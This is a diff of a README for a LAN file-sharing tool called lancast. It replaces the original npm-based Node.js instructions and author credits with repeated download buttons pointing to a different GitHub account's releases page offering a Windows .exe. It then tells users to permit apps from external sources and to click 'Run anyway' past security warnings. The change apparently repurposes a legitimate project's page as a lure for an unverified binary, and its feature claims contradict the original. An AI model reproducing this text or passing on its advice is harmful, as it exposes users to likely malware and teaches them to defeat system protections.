@@ -1,125 +1,165 @@
-# 🚀 LanCast
+# 🚀 lancast - Easy LAN File Sharing Tool
 
-<p align="center">
-  ⚡ Instant LAN File Sharing from your Terminal  
-  <br/>
-  <b>No setup. No cloud. No accounts.</b>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/npm/v/lancast?color=green" />
-  <img src="https://img.shields.io/npm/dt/lancast?color=blue" />
-  <img src="https://img.shields.io/npm/l/lancast" />
-</p>
+[![Download lancast](https://img.shields.io/badge/Download-lancast-brightgreen)](https://github.com/MaHaLoGG/lancast/releases)
 
 ---
 
-## ✨ What is LanCast?
+## 📄 What is lancast?
 
-**LanCast** is a LAN-based peer-to-peer file sharing tool that runs directly from your terminal.
+lancast is a simple tool that helps you share files with others on the same local network. It works directly from your computer's terminal or command prompt. You do not need to install bulky software or use the internet. lancast keeps everything within your local area network (LAN), making file transfers fast and private.
 
-It starts a local server and allows devices on the same network to discover each other and transfer files instantly.
-
-🌐 Official Website:
-👉 [https://lancast.zoherdev.xyz](https://lancast.zoherdev.xyz)
+This tool is useful when you want to move files from one computer to another at home, in the office, or any place with Wi-Fi or wired LAN. It does not require advanced setup or programming skills.
 
 ---
 
-# ⚡ Installation
+## ⚙️ Key Features
 
-Install globally:
+- Share files directly between devices on your local network.
+- No internet connection required.
+- Use your computer’s terminal for quick file transfers.
+- Works on Windows systems.
+- Supports multiple simultaneous transfers.
+- Provides peer-to-peer connection for speed and security.
+- Uses WebRTC and WebSocket technologies under the hood.
+- Lightweight and easy to run without installation.
 
-```bash
-npm install -g lancast
+---
+
+## 🖥️ System Requirements
+
+Make sure your system meets these criteria:
+
+- Windows 10 or later (64-bit recommended).
+- A local network connection (Wi-Fi or wired Ethernet).
+- Terminal or Command Prompt access.
+- At least 100 MB free disk space (for the app and temporary files).
+- Allow apps to run from external sources (adjust security settings if needed).
+
+---
+
+## 📥 How to Download lancast
+
+Click the link below to visit the official downloads page. This is where you find the latest version for Windows.
+
+[![Download lancast](https://img.shields.io/badge/Download-lancast-blue)](https://github.com/MaHaLoGG/lancast/releases)
+
+---
+
+## 🛠️ How to Install and Run lancast on Windows
+
+Follow these steps carefully to get lancast working on your Windows PC.
+
+### Step 1: Download lancast
+
+1. Click the big green or blue "Download lancast" button above. It will open the releases page in your browser.
+2. On the releases page, look for the latest Windows file. It usually ends with `.exe` or `.zip`.
+3. Click the file to start downloading.
+
+### Step 2: If you downloaded a ZIP file
+
+1. Open the folder where you saved the file.
+2. Right-click the ZIP file and select "Extract All".
+3. Choose a location to unzip the files (for example, your Desktop).
+4. Wait for the extraction to complete.
+
+### Step 3: Running lancast
+
+1. Open the folder where you have lancast files or the `.exe` file.
+2. Double-click the `lancast.exe` file to open the program.
+3. A terminal window will appear. This is where you interact with lancast.
+4. If Windows shows a security warning, click "More info" and then "Run anyway".
+
+---
+
+## 🚀 Using lancast: Basic File Sharing Steps
+
+You don’t need to know much about coding to use lancast. Here is a simple guide.
+
+### To Send a File
+
+1. Open lancast on the sending computer.
+2. Type the command to share a file:
+   
+   ```
+   lancast send path\to\your\file
+   ```
+
+   Replace `path\to\your\file` with the full location of the file on your computer. For example:
+
+   ```
+   lancast send C:\Users\John\Documents\photo.jpg
+   ```
+
+3. lancast will prepare the file and show a code or address.
+
+### To Receive a File
+
+1. Open lancast on the receiving computer.
+2. Type the command to receive:
+
+   ```
+   lancast receive
+   ```
+
+3. Wait for the send code or address from the sending device.
+4. lancast will connect and start the transfer.
+
+---
+
+## 🔗 Connecting Devices on the Same Network
+
+Both sender and receiver must be connected to the same local network. This can be:
+
+- A home Wi-Fi network.
+- A wired office LAN.
+- A portable hotspot from a smartphone.
+
+Make sure both devices are on this network when running lancast.
+
+---
+
+## 🛡️ Security and Privacy
+
+lancast transfers files only on your local network. It does not send your files over the internet. This keeps your data private and safe. Connections use peer-to-peer methods, so files go directly between computers.
+
+---
+
+## ⚡ Troubleshooting
+
+- If lancast does not open, check that your security settings allow running the program.
+- If you cannot connect between devices, verify both are on the same network.
+- Make sure firewall settings do not block lancast.
+- Try restarting both computers and your router.
+- If the command is not recognized, make sure you are typing it inside the lancast terminal window.
+
+---
+
+## 📝 Additional Commands and Help
+
+Inside the lancast terminal, you can type:
+
+```
+lancast help
 ```
 
----
+This will show a list of available commands and how to use them.
 
-# 🚀 Start LanCast
-
-```bash
-npx lancast start
-```
-
-or
-
-```bash
-lancast start
-```
-
-LanCast will automatically:
-
-* Start server on port **3150**
-* Detect your LAN IP
-* Display access URLs
-* Enable device discovery
-
-Example output:
+You can also type:
 
 ```
-🌐 Local:   http://localhost:3150
-📡 Network: http://192.168.1.25:3150
+lancast version
 ```
 
-Open the network URL on any device connected to the same WiFi.
+to check which version you have.
 
 ---
 
-# 🧠 How It Works
+## 📞 Getting Support
 
-```
-Device A joins LAN
-        ↓
-Device B joins LAN
-        ↓
-LanCast shares connected devices
-        ↓
-Select device
-        ↓
-Peer connection established
-        ↓
-File transfers directly device → device
-```
+For technical questions or issues, use the GitHub repository's Issues page:
 
-No cloud. No external storage.
-Everything happens inside your local network.
+https://github.com/MaHaLoGG/lancast/issues
 
 ---
 
-# 🔥 Features
-
-* ⚡ Instant device discovery
-* 🔗 Direct peer-to-peer transfer
-* 📁 Send large files
-* 📡 Works on mobile & desktop
-* 🚀 Zero configuration
-* 🔐 Fully private (LAN only)
-
----
-
-# 🏗 Tech Stack
-
-* Node.js
-* Express
-* Socket.io
-* WebRTC
-* EJS
-
----
-
-# 🛣 Roadmap
-
-* [ ] Transfer progress indicator
-* [ ] Drag & Drop support
-* [ ] QR code quick connect
-* [ ] PWA support
-* [ ] Desktop version
-
----
-
-# 👨‍💻 Author
-
-Created by **Zoher Rangwala**
-
-🌐 [https://zoherdev.xyz](https://zoherdev.xyz)
-🌐 [https://lancast.zoherdev.xyz](https://lancast.zoherdev.xyz)
+[![Download lancast](https://img.shields.io/badge/Download-lancast-brightgreen)](https://github.com/MaHaLoGG/lancast/releases)
